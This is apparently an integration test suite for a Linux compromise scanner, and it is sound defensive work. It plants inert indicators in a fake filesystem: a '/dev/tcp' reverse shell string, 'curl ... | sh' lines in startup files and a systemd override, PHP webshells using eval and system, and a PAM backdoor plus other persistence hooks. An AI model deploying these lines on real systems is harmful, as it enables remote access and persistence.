#!/usr/bin/env python3
"""Offline integration fixtures; never execute planted payloads."""
import json
import hashlib
import shutil
import os
from pathlib import Path
import subprocess
import tempfile
import unittest

SCRIPT = Path(__file__).resolve().parents[1] / 'bluesweep.sh'

class Integration(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix='bluesweep-integration-')
        self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name)
        self.root = self.base / 'victim'
        self.root.mkdir()
        self.put('etc/passwd', 'root:x:0:0:root:/root:/bin/bash\n')
        self.put('etc/group', 'root:x:0:\n' + (f'fixture:x:{os.getgid()}:\n' if os.getgid() else ''))
        if os.getuid():
            with (self.root/'etc/passwd').open('a') as out:
                out.write(f'fixture:x:{os.getuid()}:{os.getgid()}:fixture:/nonexistent:/usr/sbin/nologin\n')
        os.utime(self.root/'etc/passwd', (1600000000,1600000000))
        self.put('etc/shadow', 'root:!:1:0:99999:7:::\n', 0o600)
        self.put('etc/hostname', 'fixture\n')
        self.put('etc/machine-id', '0123456789abcdef0123456789abcdef\n')
        self.put('etc/crontab', '0 0 * * * root /usr/bin/true\n')
        self.put('etc/systemd/system/clean.service', '[Service]\nExecStart=/usr/bin/true\n')
        self.put('etc/ssh/sshd_config', 'PermitRootLogin no\nPasswordAuthentication no\n')
        self.put('root/.ssh/authorized_keys', 'ssh-ed25519 AAAA clean\n')
        self.put('root/.bashrc', '# clean\n')
        self.put('usr/bin/true', 'fixture, not executable\n')

    def put(self, name, content, mode=0o644):
        path = self.root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content)
        path.chmod(mode)
        os.utime(path, (1600000000,1600000000))
        return path

    def run_scan(self, *args):
        result = subprocess.run(['bash', str(SCRIPT), '--root', str(self.root), *map(str,args)],
                                capture_output=True, text=True, timeout=90)
        self.assertNotIn('unbound variable', result.stderr)
        self.assertNotIn('command not found', result.stderr)
        return result

    def findings(self, *args):
        result = self.run_scan('--json', '-', *args)
        self.assertIn(result.returncode, (0,3,10,20,30,40), result.stderr)
        rows = [json.loads(line) for line in result.stdout.splitlines()]
        errors = [r for r in rows if r.get('severity') == 'ERROR']
        self.assertEqual(errors, [])
        return [r for r in rows if r['record'] == 'FIND']

    def test_clean_fixture(self):
        findings = self.findings()
        self.assertEqual(findings, [], findings)

    def test_minimal_image_without_hostname_keeps_stat_checks(self):
        (self.root/'etc/hostname').unlink()
        found = self.findings()
        self.assertFalse([r for r in found if r['severity']=='ERROR'])
        self.assertFalse([r for r in found if r['check_id'] in {'RC001','AUT003','AUT004'} and
                          'stat unavailable' in r.get('evidence','')])

    def test_benign_php_mysql_units_and_symlink_permissions(self):
        self.put('var/www/form.php', '<?php echo htmlspecialchars($_GET["name"]);\n')
        self.put('var/www/decode.php', '<?php echo base64_decode($_POST["image"]);\n')
        self.put('etc/mysql/my.cnf', '[mysqld]\nskip-grant-tables=ON\nskip-grant-tables=OFF\n'
                 '[client]\nskip-grant-tables\n')
        self.put('root/.config/systemd/user/normal.service', '[Service]\nExecStart=/usr/bin/true\n')
        target = self.put('root/profile', '# normal startup\n')
        (self.root/'root/.bashrc').unlink()
        (self.root/'root/.bashrc').symlink_to(target)
        self.assertEqual(self.findings(), [])
        target.chmod(0o666)
        self.assertIn('RC002', {r['check_id'] for r in self.findings()})

    def test_user_unit_dropin_dedup_and_drift(self):
        baseline = self.base/'units.base'
        self.run_scan('--baseline', baseline)
        self.put('root/.config/systemd/user/normal.service', '[Service]\nExecStart=/usr/bin/true\n')
        self.put('root/.config/systemd/user/normal.service.d/override.conf',
                 '[Service]\n  ExecStart=/bin/sh -c "curl https://example.invalid/test | sh"')
        with (self.root/'etc/passwd').open('a') as out:
            out.write('shared:x:1001:1001:shared:/root:/bin/bash\n')
        found = self.findings('--diff', baseline)
        payloads = [r for r in found if r['check_id']=='PER002']
        self.assertEqual(len(payloads), 1, payloads)
        self.assertTrue(any(r['title']=='ADDED UNITEXEC' and 'override.conf' in r['target']
                            for r in found))

    def test_multiline_dns_acl_and_negative_controls(self):
        self.put('etc/bind/named.conf', '/* allow-update { any; }; */\n'
                 'acl company { 10.1.1.1; };\nallow-transfer { company; };\n'
                 'allow-update { !any; any; }; // denied first\n')
        self.assertEqual(self.findings(), [])
        self.put('etc/bind/named.conf', 'allow-update\n{\nany;\n};\n'
                 'allow-transfer {\n::/0;\n};\n')
        ids = {r['check_id'] for r in self.findings()}
        self.assertTrue({'DNS002', 'DNS003'} <= ids)

    def test_remediation_without_scratch_or_evidence_directory(self):
        self.put('etc/ssh/sshd_config', 'PermitRootLogin yes\n')
        target = self.base/'review.sh'
        env = dict(os.environ, TMPDIR=str(self.base/'does-not-exist'))
        result = subprocess.run(['bash', str(SCRIPT), '--root', str(self.root),
                                 '--remediate', str(target)], env=env,
                                capture_output=True, text=True, timeout=90)
        self.assertEqual(result.returncode, 3, result.stderr)
        text = target.read_text()
        self.assertIn('COULD DISRUPT SSH', text)
        self.assertTrue(all(not line.strip() or line.startswith('#') for line in text.splitlines()))
        self.assertEqual({p.name for p in self.base.iterdir()}, {'victim', 'review.sh'})

    def test_runtime_service_policy_uses_kernel_argv_and_relocated_ports(self):
        # Exercise the collector/check boundary with inert synthetic proc files.
        # No daemon or planted command is ever executed.
        proc = self.root/'proc'
        for pid, name, args in [(1, 'init', ['init']),
                (20, 'distccd', ['distccd', '--allow=0.0.0.0/0']),
                (21, 'Xtigervnc', ['Xtigervnc', '-SecurityTypes', 'TLSNone,VncAuth']),
                (22, 'mysqld', ['mysqld', '--skip-grant-tables=OFF'])]:
            self.put(f'proc/{pid}/stat', f'{pid} ({name}) S 1 1 1 0 0 0\n')
            (proc/str(pid)/'cmdline').write_bytes(b'\0'.join(a.encode() for a in args)+b'\0')
        command = '''source <(sed '$d' "$1")
ROOT=$2; PROCFS=$ROOT/proc; CAP_PROC=1; CAP_PS=0
col_proc
LISTEN_ROWS=('tcp|0.0.0.0|43632|0|120' 'tcp|0.0.0.0|45900|1000|121')
SOCK_PID[120]=20; SOCK_PID[121]=21
run_check chk_services
'''
        result = subprocess.run(['bash', '-c', command, '_', str(SCRIPT), str(self.root)],
                                text=True, capture_output=True, timeout=10)
        self.assertEqual(result.returncode, 0, result.stderr)
        rows = [line.split('\t') for line in result.stdout.splitlines()]
        found = {r[1]:r for r in rows if r[0]=='FIND'}
        self.assertIn('SRV001', found)
        self.assertIn('43632', found['SRV001'][7])
        self.assertEqual(found['SRV004'][2], 'CRIT')
        self.assertNotIn('SRV005', found)  # socket creator UID is not daemon EUID
        self.assertNotIn('SQL005', found)
        self.assertIn(['OBS', 'SERVICE_BIND', 'vnc', 'tcp:0.0.0.0:45900'], rows)

    def test_mapping_dedup_and_jit_inventory(self):
        mapping = '1000-2000 r-xp 00000000 00:01 99 /memfd:JITCode (deleted)\n'
        self.put('proc/20/maps', mapping + mapping +
                 '3000-4000 r-xp 00000000 00:01 100 /tmp/payload (deleted)\n')
        command = '''source <(sed '$d' "$1")
ROOT=$2; PROCFS=$ROOT/proc; CAP_PROC=1; PROC_PIDS=(20 21)
PROC_COMM[20]=fixture; PROC_COMM[21]=unreadable
run_check chk_process_mappings
'''
        result = subprocess.run(['bash', '-c', command, '_', str(SCRIPT), str(self.root)],
                                text=True, capture_output=True, timeout=10)
        self.assertEqual(result.returncode, 0, result.stderr)
        rows = [line.split('\t') for line in result.stdout.splitlines()]
        findings = [r for r in rows if r[0]=='FIND']
        self.assertEqual([(r[1],r[2]) for r in findings], [('MAP001','INFO'),('MAP002','HIGH')])
        self.assertTrue(any(r[:2]==['SKIP','MAP000'] for r in rows))

    def test_reverse_shell_rule_does_not_flag_scanner_rule_text(self):
        command = '''source <(sed '$d' "$1")
CAP_PROC=1; PROC_PIDS=(20 21 22); PROCFS=$2/proc
PROC_COMM[20]=awk; PROC_CMD[20]="awk $RULES_PROG"
PROC_COMM[21]=bash; PROC_CMD[21]='bash -c bash -i >&/dev/tcp/192.0.2.1/4444 0>&1'
PROC_COMM[22]=bash; PROC_CMD[22]='bash -c echo /dev/tcp/example'
run_check chk_extra_procs
'''
        result = subprocess.run(['bash','-c',command,'_',str(SCRIPT),str(self.root)],
                                text=True,capture_output=True,timeout=10)
        self.assertEqual(result.returncode, 0, result.stderr)
        findings = [r.split('\t') for r in result.stdout.splitlines() if r.startswith('FIND\tPRC010\t')]
        self.assertEqual([r[6] for r in findings], ['pid=21'])

    def test_service_persistence_and_webshell_fixtures(self):
        fixtures = {
            'etc/pam.d/backdoor': 'auth sufficient pam_permit.so\n',
            'etc/udev/rules.d/99-test.rules': 'ACTION=="add", RUN+="/tmp/test"\n',
            'etc/modprobe.d/test.conf': 'install test /bin/sh -c true\n',
            'etc/apt/apt.conf.d/99-test': 'APT::Update::Post-Invoke { "true"; };\n',
            'etc/aliases': 'root: |/tmp/test\n',
            'etc/postfix/main.cf': 'mynetworks = 0.0.0.0/0\n',
            'etc/bind/named.conf': 'allow-recursion { any; };\nallow-transfer { any; };\nallow-update { any; };\n',
            'etc/vsftpd.conf': 'anonymous_enable=YES\nanon_upload_enable=YES\n',
            'etc/mysql/my.cnf': 'skip-grant-tables\ninit_file=/tmp/test\n',
            'etc/php.ini': 'auto_prepend_file=/tmp/test.php\n',
            'etc/exports': '/srv *(rw,no_root_squash)\n',
            'etc/samba/smb.conf': 'guest ok = yes\nwide links = yes\n',
            'var/www/shell.php': '<?php eval(base64_decode($_POST["x"])); system($_GET["cmd"]);\n',
            'etc/systemd/system/bad.service': '[Service]\nExecStart=/tmp/test\n',
        }
        for path, value in fixtures.items(): self.put(path, value)
        ids = {r['check_id'] for r in self.findings()}
        for expected in ['PAM002','PER110','PER111','PER112','SMTP001','SMTP002','DNS001','DNS002','DNS003',
                         'FTP001','FTP002','SQL001','SQL002','WEB101','NFS001','NFS002','SMB001','SMB002','WEB001','PER101']:
            self.assertIn(expected, ids)

    def test_snapshot_roundtrip_and_identity(self):
        baseline = self.base / 'clean.base'
        result = self.run_scan('--baseline', baseline)
        self.assertIn(result.returncode, (0,3), result.stderr)
        unchanged = self.findings('--diff', baseline)
        self.assertFalse([r for r in unchanged if r['category']=='drift'], unchanged)
        self.put('tmp/su', 'benign SUID fixture\n', 0o4755)
        self.put('etc/crontab', '* * * * * root /tmp/test\n')
        self.put('root/.ssh/authorized_keys', 'ssh-ed25519 BBBB new-key\n')
        findings = self.findings('--diff', baseline)
        titles = {r['title'] for r in findings if r['category']=='drift' and r['severity']=='CRIT'}
        self.assertTrue({'ADDED SUID','ADDED CRON','ADDED SSHKEY'} <= titles, titles)
        self.put('etc/hostname', 'different-host\n')
        self.assertEqual(self.run_scan('--diff', baseline).returncode, 2)
        self.assertNotEqual(self.run_scan('--diff', baseline, '--force').returncode, 2)

    def test_exports_and_no_clobber(self):
        out = self.base / 'evidence'
        remediation = self.base / 'review.sh'
        self.put('etc/aliases', 'root: |/tmp/test\n')
        result = self.run_scan('--ir', out, '--remediate', remediation)
        self.assertEqual(result.returncode, 3, result.stderr)
        for name in ['records.tsv','findings.ndjson','report.md','manifest.tsv','manifest.digest']:
            self.assertTrue((out/name).is_file(), name)
        for line in (out/'findings.ndjson').read_text().splitlines(): json.loads(line)
        for line in (out/'manifest.tsv').read_text().splitlines()[1:]:
            artifact, source, algorithm, digest = line.split('\t')
            self.assertEqual(algorithm,'sha256sum')
            self.assertEqual(hashlib.sha256((out/artifact).read_bytes()).hexdigest(),digest)
        self.assertEqual(hashlib.sha256((out/'manifest.tsv').read_bytes()).hexdigest(),
                         (out/'manifest.digest').read_text().split()[0])
        commands = [line for line in remediation.read_text().splitlines() if line.strip() and not line.startswith('#')]
        self.assertEqual(commands, [])
        before = (out/'manifest.tsv').read_bytes()
        self.assertEqual(self.run_scan('--out', out).returncode, 2)
        self.assertEqual((out/'manifest.tsv').read_bytes(), before)

    def test_hostile_names_hunt_and_json(self):
        self.put('tmp/line\nbreak', 'fixture\n')
        self.put('etc/quoted"back\\slash.conf', 'ARTEMIS{fixture}\n')
        result = self.findings('--hunt', 'ARTEMIS[{]')
        self.assertIn('FS002', {r['check_id'] for r in result})
        self.assertIn('HNT001', {r['check_id'] for r in result})
        self.assertEqual(self.run_scan('--hunt', '[').returncode, 2)

    def test_shell_startup_variants_and_permissions(self):
        startup = ['root/.bashrc','root/.bash_profile','root/.bash_login','root/.bash_logout',
                   'root/.zshenv','root/.zprofile','root/.zshrc','root/.zlogin','root/.zlogout',
                   'root/.profile','root/.xinitrc','root/.config/fish/config.fish',
                   'etc/zsh/zshenv','etc/profile.d/fixture.sh','home/orphan/.bashrc']
        for path in startup:
            self.put(path, 'curl https://example.invalid/test | sh')  # no trailing newline
        self.put('root/.pam_environment', 'BASH_ENV=/tmp/fixture\n',0o666)
        found = self.findings()
        targets = {r['target'] for r in found if r['check_id']=='PER003'}
        for path in startup:
            self.assertIn('/'+path, targets)
        self.assertIn('RC002', {r['check_id'] for r in found})

    def test_linpeas_privilege_and_application_checks(self):
        fixtures = {
            'etc/doas.conf':'permit nopass fixture as root\n',
            'etc/polkit-1/rules.d/test.rules':'return polkit.Result.YES;\n',
            'etc/redis/redis.conf':'protected-mode no\n',
            'etc/postgresql/main/pg_hba.conf':'host all all 0.0.0.0/0 trust\n',
            'etc/mongod.conf':'authorization: disabled\n',
            'etc/mosquitto/mosquitto.conf':'allow_anonymous true\n',
            'etc/supervisor/supervisord.conf':'chmod=0777\n',
            'etc/elasticsearch/elasticsearch.yml':'xpack.security.enabled: false\n',
            'root/.aws/credentials':'aws_secret_key = fixture_value_not_real\n',
        }
        for path,content in fixtures.items(): self.put(path,content)
        found=self.findings()
        ids={r['check_id'] for r in found}
        for expected in ['PRIV010','PRIV012','REDIS001','PG001','MONGO001','MQTT001','SUP001','ES001','SEC002','SEC011']:
            self.assertIn(expected, ids)
        for row in found:
            if row['check_id'].startswith('SEC'):
                self.assertNotIn('fixture_value_not_real',row['evidence'])

    def test_nonstandard_webroot_and_ssh_keys(self):
        self.put('etc/nginx/conf.d/test.conf', 'root /custom-web;\n')
        self.put('custom-web/a.php','<?php system($_GET["x"]);\n')
        self.put('etc/ssh/sshd_config','PermitRootLogin no\nAuthorizedKeysFile /etc/keys/%u\n')
        self.put('etc/keys/root','command="/tmp/test" ssh-ed25519 AAAA custom\n')
        ids={r['check_id'] for r in self.findings()}
        self.assertIn('WEB001',ids)
        self.assertIn('SSH031',ids)

    def test_normal_scan_preserves_fixture_and_output_exclusion(self):
        def snapshot():
            return {str(p.relative_to(self.root)):(p.read_bytes(),p.stat().st_mode,p.stat().st_mtime_ns)
                    for p in self.root.rglob('*') if p.is_file()}
        before=snapshot()
        self.findings()
        self.assertEqual(snapshot(),before)
        baseline=self.root/'etc'/'own.baseline'
        result=self.run_scan('--baseline',baseline)
        self.assertIn(result.returncode,(0,3),result.stderr)
        self.assertNotIn('own.baseline',baseline.read_text())
        result=self.findings('--diff',baseline)
        self.assertFalse([r for r in result if r['category']=='drift'],result)

    def test_baseline_rejections_and_output_protection(self):
        baseline=self.base/'clean.base'
        self.run_scan('--baseline',baseline)
        self.assertEqual(self.run_scan('--diff',baseline,'--full').returncode,2)
        original=baseline.read_text()
        baseline.write_text(original.replace('META\tschema\t2', 'META\tschema\t1'))
        rejected=self.run_scan('--diff',baseline,'--force')
        self.assertEqual(rejected.returncode,2)
        self.assertIn('baseline schema incompatible',rejected.stderr)
        baseline.write_text(original+'MARK\n')
        self.assertEqual(self.run_scan('--diff',baseline).returncode,2)
        protected=self.base/'existing.json'
        protected.write_text('keep me')
        self.assertEqual(self.run_scan('--json',protected).returncode,2)
        self.assertEqual(protected.read_text(),'keep me')
        self.put('etc/passwd','broken:x:not-a-number:0:test:/root:/bin/bash\n')
        self.assertIn('ACC015',{r['check_id'] for r in self.findings()})

    @unittest.skipUnless(shutil.which('openssl'),'OpenSSL not installed')
    def test_opt_in_password_check(self):
        encoded=subprocess.run(['openssl','passwd','-6','-salt','fixture','-stdin'],
                               input='Passw0rd123!\n',text=True,capture_output=True,check=True).stdout.strip()
        self.put('etc/shadow',f'root:{encoded}:1:0:99999:7:::\n',0o600)
        found=self.findings('--weak-pass')
        matches=[r for r in found if r['check_id']=='PWD001']
        self.assertEqual(len(matches),1)
        self.assertNotIn('Passw0rd123!',json.dumps(matches))
        self.assertNotIn(encoded,json.dumps(matches))

    def test_full_mode_and_budget(self):
        self.put('opt/app/deep/a/b/c/d/shell.php', '<?php system($_GET["x"]);\n')
        findings = self.findings('--full')
        self.assertIn('WEB001', {r['check_id'] for r in findings})
        # Pure watchdog test: timeout only the spawned sleep, never host processes.
        command = 'source <(sed \'$d\' "$1"); run_bounded 1 sleep 20; exit $?'
        run = subprocess.run(['bash','-c',command,'_',str(SCRIPT)], capture_output=True, timeout=5)
        self.assertEqual(run.returncode,124)

if __name__ == '__main__': unittest.main(verbosity=2)
